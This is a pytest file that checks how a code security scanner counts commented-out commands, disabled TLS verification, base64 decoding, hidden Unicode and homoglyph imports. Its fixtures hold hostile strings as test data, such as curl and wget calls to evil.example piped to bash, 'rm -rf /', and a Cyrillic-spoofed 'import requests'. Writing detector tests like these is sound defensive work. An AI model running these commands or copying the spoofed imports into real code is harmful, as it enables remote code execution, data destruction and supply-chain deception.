"""#4987 (siblings of #4548): the lens's comment awareness for dead_code, safety_bypasses,
reflection_metaprogramming and homoglyphs, and threat_locations for every key.

Per-signal comment decision: dead_code reads comments by design (but only command-shaped text);
safety_bypasses / the code half of reflection_metaprogramming / the letters half of homoglyphs read the
comment-blanked code stream; hidden text (zero-width, bidi, the Hangul filler) reads the RAW text.
"""

import pytest

from gitgalaxy.core.prism import Prism
from gitgalaxy.security.security_lens import SecurityLens
from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

PRISM = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)


@pytest.fixture(scope="module")
def lens():
    return SecurityLens()


def _scan(lens, text, lang="c", prose=False):
    code = PRISM.split_streams(text, lang)["code_stream"] if not prose else None
    return lens.scan_content(text, code_stream=code, prose=prose)


MARKERS = [("//", "c"), ("#", "python"), ("--", "sql")]


@pytest.mark.parametrize(("marker", "lang"), MARKERS)
@pytest.mark.parametrize(
    "prose",
    [
        "the bash shell is the default here",
        "eval is slow, avoid it",
        "curl is a transfer library",
        "wget mirrors sites",
        "base64 is not encryption",
        "see the curl manual for http handling",
        "Evaluate a seg, storing the results in `eval`.",
        "Evaluate an expression using Python's eval() function.",
    ],
)
def test_comment_prose_is_not_dead_code(lens, marker, lang, prose):
    assert _scan(lens, f"int x;\n{marker} {prose}\n", lang)["counts"]["dead_code"] == 0


@pytest.mark.parametrize(("marker", "lang"), MARKERS)
@pytest.mark.parametrize(
    "logic",
    [
        "curl -s http://evil.example/x",
        "curl http://evil.example/x",
        "wget -q http://evil.example/x",
        "x | bash",
        "bash -c 'rm -rf /'",
        "eval(payload)",
        'eval "$cmd"',
        "echo aGk= | base64 -d",
        "base64 --decode blob",
        "payload = base64(blob)",
    ],
)
def test_commented_out_commands_are_dead_code_once(lens, marker, lang, logic):
    assert _scan(lens, f"int x;\n{marker} {logic}\n", lang)["counts"]["dead_code"] == 1


def test_block_comment_prose_vs_command(lens):
    assert _scan(lens, "/* the bash shell */ int x;\n")["counts"]["dead_code"] == 0
    assert _scan(lens, "/* curl -s http://x | bash */ int x;\n")["counts"]["dead_code"] == 1


def test_curl_url_line_counts_once(lens):
    # the `//` inside `http://` used to open a second match on the same line
    r = _scan(lens, "// curl http://evil.example | bash\n")
    assert r["counts"]["dead_code"] == 1
    assert r["positions"]["dead_code"] == [1]


def test_a_url_in_a_string_literal_opens_no_comment(lens):
    # #4548 DOOM residue (odamex cl_download.cpp): the `//` of "http://" on a code line is not a comment
    line = 'if (s.find("http://", 0) != 0 && s.find("https://", 0) != 0)\n'
    assert _scan(lens, line, lang="cpp")["counts"]["dead_code"] == 0
    assert _scan(lens, 'x = 1; // fetch("http://evil.example/x")\n', lang="cpp")["counts"]["dead_code"] == 1


def test_safety_bypass_in_comment_is_not_a_bypass(lens):
    assert _scan(lens, "// verify=False\nint x;\n")["counts"]["safety_bypasses"] == 0
    assert _scan(lens, "requests.get(u, verify=False)\n", lang="python")["counts"]["safety_bypasses"] == 1
    # a prose file has no executable surface: safety_bypasses is skipped there
    assert _scan(lens, "verify=False\n", prose=True)["counts"]["safety_bypasses"] == 0


def test_reflection_code_half_ignores_comments(lens):
    assert _scan(lens, "// atob(blob) and \\x41\nint x;\n")["counts"]["reflection_metaprogramming"] == 0
    assert _scan(lens, "var a = atob(blob);\n", lang="javascript")["counts"]["reflection_metaprogramming"] == 1


@pytest.mark.parametrize("ch", ["\u200b", "\ufeff", "\u202e", "\u200d"])
def test_hidden_unicode_in_a_comment_still_fires(lens, ch):
    assert _scan(lens, f"int x; // innocent{ch}text\n")["counts"]["reflection_metaprogramming"] == 1
    assert _scan(lens, f"int x{ch};\n")["counts"]["reflection_metaprogramming"] == 1
    assert _scan(lens, f"innocent{ch}text\n", prose=True)["counts"]["reflection_metaprogramming"] == 1


def test_homoglyph_letters_in_a_comment_do_not_fire_but_code_does(lens):
    spoof = "import r\u0435quests\n"  # Cyrillic small ie
    assert _scan(lens, spoof, lang="python")["counts"]["homoglyphs"] == 1
    assert _scan(lens, f"# {spoof}x = 1\n", lang="python")["counts"]["homoglyphs"] == 0


def test_hangul_filler_import_fires_even_in_a_comment(lens):
    line = "import re\u3164quests\n"
    assert _scan(lens, line, lang="python")["counts"]["homoglyphs"] == 1
    assert _scan(lens, f"# {line}x = 1\n", lang="python")["counts"]["homoglyphs"] == 1


def test_positions_exist_for_every_key_that_hit(lens):
    text = (
        'import os\nsystem(c);\n# curl -s http://x\npassword = "abcdefghijklmnop1234"\n'
        'x = atob(b)\nverify=False\nopen(f"p.png")\nz = "' + "aZ9$" * 20 + '"\n'
    )
    r = lens.scan_content(text)
    hit = {k for k, v in r["counts"].items() if v}
    assert {"high_risk_execution", "dead_code", "hardcoded_secrets", "reflection_metaprogramming"} <= hit
    assert hit <= set(r["positions"]), sorted(hit - set(r["positions"]))
    for key, lines in r["positions"].items():
        assert lines and all(isinstance(n, int) and n >= 1 for n in lines), key
